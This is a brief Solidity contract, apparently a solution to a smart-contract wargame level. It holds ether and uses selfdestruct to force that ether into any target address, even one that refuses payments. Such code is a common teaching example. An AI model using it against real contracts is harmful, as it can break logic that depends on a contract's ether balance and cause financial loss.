pragma solidity ^0.4.18;

contract ForceAttack {

  function ForceAttack() public payable {}
  function() public payable {}

  function attack(address target) public {
    selfdestruct(target);
  }
}
